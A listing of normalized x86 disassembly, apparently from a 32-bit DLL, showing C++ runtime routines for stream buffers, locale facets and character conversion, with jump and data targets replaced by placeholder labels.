mov [ eax + 0x24 ] edx
lea edx [ eax + 0x28 ]
mov [ eax + 0x30 ] edx
lea ecx [ eax + 0x8 ]
mov [ eax + 0x10 ] ecx
lea edx [ eax + 0x2c ]
mov [ eax + 0x34 ] edx
xor edx edx
lea ecx [ eax + 0xc ]
mov [ eax + 0x14 ] ecx
mov [ ecx ] edx
mov ecx [ eax + 0x24 ]
mov [ ecx ] edx
mov ecx [ eax + 0x34 ]
mov [ ecx ] edx
mov ecx [ eax + 0x10 ]
mov [ ecx ] edx
mov ecx [ eax + 0x20 ]
mov [ ecx ] edx
mov eax [ eax + 0x30 ]
mov [ eax ] edx
retn
sub_1000bf88
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
movzx eax [ esi ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_1000c054
dec [ ebp + 0x1c ]
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop esi
sub_1000bfbc
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x20 ] 0x0
je r-xdata
push esi
push edi
push [ ebp + 0x14 ]
lea eax [ esp + 0x1c ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_1000bf88
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] ecx
je r-xdata
inc edi
dec ebx
jmp r-xdata
push 0x1
push [ ebp + 0x20 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x28 ]
push eax
push [ ebp + 0x8 ]
call sub_1000b6da
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_10024c40
add esp 0xc
test eax eax
je r-xdata
sub_1000c054
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
push [ esp + 0x8 ]
call sub_1000c8c4
cmp eax 0xffffffff
jne r-xdata
mov eax esi
pop esi
retn 0x4
sub_1000c0bf
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
pop esi
retn
call sub_1000ce3b
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_1000c0e1
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
call sub_1000ce6c
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x5 ] al
jmp r-xdata
mov al [ esi + 0x5 ]
mov [ esi + 0x4 ] 0x1
pop esi
retn
sub_1000c105
push ebp
mov ebp esp
push 0x0
mov ecx esi
mov [ esi + 0x18 ] 0xf
call sub_10002004
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
push esi
call sub_1000c7de
mov eax esi
pop ebp
retn 0x10
sub_1000c133
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000c471
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_1000c1d0
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000c510
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_1000c26d
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000c5e9
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_1000c30a
push 0x38
mov eax sub_1004bee7
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x44 ] eax
mov al [ edi ]
test al al
je r-xdata
push 0x0
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
call sub_100079fe
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x40 ] 0xfffffffe
mov [ ebp - 0x38 ] 0x1
mov cl al
mov edx edi
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
mov eax [ ebp - 0x40 ]
call sub_100282ef
retn
mov al [ esi + edi ]
test al al
je r-xdata
inc edx
mov cl [ edx ]
test cl cl
jne r-xdata
inc [ ebp + 0x10 ]
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
cmp [ eax ] 0x0
je r-xdata
mov cl [ edi ]
cmp cl al
jne r-xdata
add esi [ ebp - 0x38 ]
mov al [ esi + edi ]
cmp al [ edi ]
je r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
movsx eax [ eax ]
add esi eax
jmp r-xdata
inc esi
mov al [ esi + edi ]
test al al
jne r-xdata
push 0x7f
pop ebx
cmp [ ebp - 0x38 ] ebx
jae r-xdata
test al al
je r-xdata
inc [ ebp - 0x34 ]
mov eax [ ebp - 0x34 ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp al cl
je r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov [ eax ] bl
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x40 ] eax
mov ebx [ ebp - 0x38 ]
push [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
call sub_1000c5af
test al al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
push 0x7f
pop ebx
cmp [ ebp - 0x38 ] ebx
jae r-xdata
mov ecx [ ebp - 0x3c ]
call sub_1000c075
cmp [ esi + edi ] al
jne r-xdata
push [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
call sub_1000c5af
test al al
jne r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10007b0c
mov [ eax ] bl
jmp r-xdata
mov ebx [ ebp - 0x38 ]
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x3c ]
inc [ ebp - 0x38 ]
call sub_1000c0bf
or [ ebp - 0x40 ] 0xffffffff
jmp r-xdata
xor esi esi
mov [ ebp - 0x2d ] 0x0
mov [ ebp - 0x34 ] esi
cmp [ ebp + 0x10 ] esi
jbe r-xdata
sub_1000c471
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x4
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
mov [ ebp - 0x4 ] 0x1
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1000c68c
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_1000c510
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x4
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
mov [ ebp - 0x4 ] 0x1
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1000c6ad
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_1000c5af
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x4 ] bl
jne r-xdata
mov esi [ esp + 0x10 ]
cmp [ esi + 0x4 ] bl
jne r-xdata
call sub_1000c0e1
cmp [ edi ] ebx
jne r-xdata
mov ecx esi
call sub_1000c0e1
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_1000c5e9
push 0x98
mov eax sub_1004d801
call sub_10028203
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x4
pop eax
call sub_100282db
retn
cmp [ eax ] edi
jne r-xdata
push 0x18
call sub_10024389
pop ecx
mov [ ebp - 0x14 ] eax
xor ebx ebx
inc ebx
push 0x3
mov [ ebp - 0x4 ] edi
pop esi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
call sub_10003832
mov [ ebp - 0x4 ] bl
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x10 ] ebx
call sub_100037dd
push ebx
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x14 ]
push edi
push eax
mov [ ebp - 0x10 ] esi
call sub_1000c6ce
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
call sub_1000384f
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
test [ ebp - 0x10 ] 0x2
mov [ ecx ] eax
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x30 ]
call sub_10002020
sub_1000c6ce
push 0x4
mov eax sub_1004bea9
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
mov [ esi ] r--data
call sub_1000c704
mov eax esi
call sub_100282db
retn 0xc
sub_1000c704
push 0xc
mov eax sub_1004cabb
call sub_10028236
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_10024c18
xor ebx ebx
mov edi eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_10023577
lea eax [ ebp - 0x18 ]
push eax
push ebx
push [ edi + 0x8 ]
call sub_1000847e
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_10023577
lea eax [ ebp - 0x18 ]
push eax
push ebx
push r--data
call sub_1000847e
add esp 0xc
mov [ esi + 0x10 ] eax
call sub_10023577
lea eax [ ebp - 0x18 ]
push eax
push ebx
push r--data
call sub_1000847e
or [ ebp - 0x4 ] 0xffffffff
add esp 0xc
mov [ esi + 0x14 ] eax
call sub_10023577
mov eax [ edi ]
mov al [ eax ]
mov [ esi + 0xc ] al
call sub_10023577
mov eax [ edi + 0x4 ]
mov al [ eax ]
mov [ esi + 0xd ] al
cmp [ ebp + 0xc ] bl
je r-xdata
call sub_100282db
retn 0x8
call sub_10023577
lea eax [ ebp - 0x18 ]
push eax
push ebx
push r--data
call sub_1000847e
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_10023577
mov [ esi + 0xc ] 0x2e
call sub_10023577
mov [ esi + 0xd ] 0x2c
sub_1000c7de
push 0x14
mov eax sub_1004ce7b
call sub_10028236
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_10008585
mov ecx [ ebp + 0x8 ]
push eax
call sub_100084a7
and [ ebp - 0x4 ] 0x0
call sub_100282db
retn 0x18
lea ecx [ ebp + 0x10 ]
call sub_10005274
movzx eax [ eax ]
mov ecx [ ebp + 0x8 ]
push eax
push 0x1
call sub_10007a24
lea ecx [ ebp + 0x10 ]
call sub_10005239
jmp r-xdata
lea eax [ ebp + 0x18 ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_10008559
test al al
jne r-xdata
sub_1000c867
push 0x4
mov eax sub_1004caa0
call sub_10028236
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10024389
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_100282db
retn 0x4
sub_1000c8c4
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
movzx edx [ esp + 0x4 ]
mov eax [ ecx ]
push edx
call [ eax + 0x4 ]
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
mov al [ esp + 0x4 ]
mov [ ecx ] al
movzx eax al
jmp r-xdata
test eax eax
jle r-xdata
retn 0x4
sub_1000c926
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x10 ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
mov ecx [ edi + 0x30 ]
mov esi [ ecx ]
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x14 ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x10 ] esi
jge r-xdata
test esi esi
jle r-xdata
pop esi
pop ebx
mov [ ebx ] al
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0x10 ]
push esi
push [ eax ]
push [ ebp + 0xc ]
push ebx
call sub_10001fe8
mov eax [ edi + 0x30 ]
sub [ eax ] esi
mov eax [ edi + 0x20 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0x10 ] esi
add esp 0x10
add ebx esi
add [ eax ] esi
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov eax [ edi + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
sub_1000c9a1
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0x8
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor ecx ecx
mov ecx [ edi + 0x34 ]
mov ecx [ ecx ]
jmp r-xdata
movzx eax [ ebx ]
mov edx [ edi ]
push eax
mov ecx edi
call [ edx + 0x4 ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0xc ] ecx
mov esi ecx
jge r-xdata
test ecx ecx
jle r-xdata
pop esi
pop ebx
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0xc ]
push esi
push ebx
push ecx
push [ eax ]
call sub_10001fe8
mov eax [ edi + 0x34 ]
sub [ eax ] esi
mov eax [ edi + 0x24 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0xc ] esi
add esp 0x10
add ebx esi
add [ eax ] esi
jmp r-xdata
mov esi [ ebp + 0xc ]
mov eax [ edi + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
sub_1000ca57
push esi
mov esi ecx
push edi
mov edi [ esi + 0x38 ]
mov [ esi ] r--data
test edi edi
je r-xdata
pop edi
lea ecx [ esi + 0x4 ]
pop esi
jmp sub_10023115
mov ecx edi
call sub_10003c49
push edi
call sub_100242e6
pop ecx
sub_1000ca80
push esi
lea esi [ ecx - 0x4 ]
lea eax [ esi + 0x4 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax - 0x4 ] r--data
push eax
mov [ eax ] r--data
call sub_10023026
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000cac5
push esi
lea esi [ ecx - 0x8 ]
lea eax [ esi + 0x8 ]
mov ecx [ eax - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_10023026
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1000cb71
push esi
mov esi [ esp + 0x8 ]
cmp esi [ esp + 0xc ]
je r-xdata
mov eax esi
pop esi
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1002358d
mov [ esi ] al
inc esi
pop ecx
pop ecx
cmp esi [ esp + 0x10 ]
jne r-xdata
pop edi
sub_1000cbb0
push esi
mov esi [ esp + 0x8 ]
cmp esi [ esp + 0xc ]
je r-xdata
mov eax esi
pop esi
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_10024082
mov [ esi ] al
inc esi
pop ecx
pop ecx
cmp esi [ esp + 0x10 ]
jne r-xdata
pop edi
sub_1000cc12
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
cmp [ ebp + 0x14 ] esi
jae r-xdata
push esi
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_100242f1
mov eax [ ebp + 0xc ]
add esp 0x10
pop esi
pop ebp
retn 0x10
call sub_10024832
sub_1000cc40
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x28 ]
pop ebp
retn 0x10
sub_1000cc66
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
cmp [ ebp + 0x18 ] esi
jae r-xdata
push esi
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
call sub_100242f1
mov eax [ ebp + 0xc ]
add esp 0x10
pop esi
pop ebp
retn 0x14
call sub_10024832
sub_1000cc94
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
lea eax [ ebp - 0x10 ]
mov edi ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_10003756
add edi 0x8
mov esi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
leave
retn 0x4
sub_1000ccd8
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x2
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x18
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
mov [ ebp - 0x4 ] 0x1
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1000ccb9
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
mov [ ebp - 0x4 ] 0x2
test [ ebp - 0x10 ] 0x2
mov [ esi ] eax
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_1000cd79
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000ccd8
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_1000ce16
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
movzx eax [ ecx ]
pop esi
retn
or eax eax
pop esi
retn
sub_1000ce3b
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x30 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
jmp [ eax + 0x14 ]
mov eax [ ecx + 0x30 ]
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x1 ]
mov [ ecx ] edx
movzx eax [ eax ]
retn
test eax eax
jle r-xdata
sub_1000ce6c
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor edx edx
mov edx [ ecx + 0x30 ]
mov edx [ edx ]
jmp r-xdata
mov eax [ ecx ]
jmp [ eax + 0x10 ]
mov eax [ eax ]
movzx eax [ eax ]
retn
test edx edx
jle r-xdata
sub_1000ce8c
push 0x4
mov eax sub_1004ec6f
call sub_10028236
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov eax [ eax + 0x2c ]
test eax eax
je r-xdata
push 0x0
push eax
call sub_10003dcd
xor al al
or ecx 0x4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov esi eax
call sub_1000538a
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x10 ]
test cl 0x1
je r-xdata
mov al 0x1
jmp r-xdata
lea ecx [ ebp + 0xc ]
push ecx
mov ecx [ eax + 0x4 ]
add ecx edi
call sub_10003446
and [ ebp - 0x4 ] 0x0
push eax
call sub_1000cd79
pop ecx
lea ecx [ ebp + 0xc ]
mov ebx eax
call sub_10003c49
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x28 ]
call sub_100282db
retn 0x8
mov ecx [ ebx + 0x10 ]
movzx eax al
test [ ecx + eax * 2 ] 0x48
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov ecx [ eax + 0x8 ]
or ecx 0x1
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov esi [ eax + edi + 0x28 ]
mov ecx [ esi + 0x20 ]
xor eax eax
cmp [ ecx ] eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x0
push eax
call sub_10003dcd
jmp r-xdata
or ecx 0x4
cmp eax 0x1
jle r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax ]
mov ecx esi
call sub_1000ce3b
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
inc [ eax ]
mov eax [ esi + 0x20 ]
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov ecx esi
jmp r-xdata
or eax eax
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
call sub_1000ce6c
sub_1000cf8a
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10003dcd
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
or ecx 0x4
sub_1000cfea
push 0x0
mov eax sub_1004efa9
call sub_10028203
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
test eax eax
je r-xdata
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push [ esi ]
call sub_1000ce8c
mov [ esi + 0x4 ] al
mov eax esi
call sub_100282db
retn 0xc
lea ecx [ eax + 0x4 ]
call sub_1002312c
sub_1000d05d
push 0x0
mov eax sub_1004efa9
call sub_10028203
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call j_sub_1002a680
test al al
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax ]
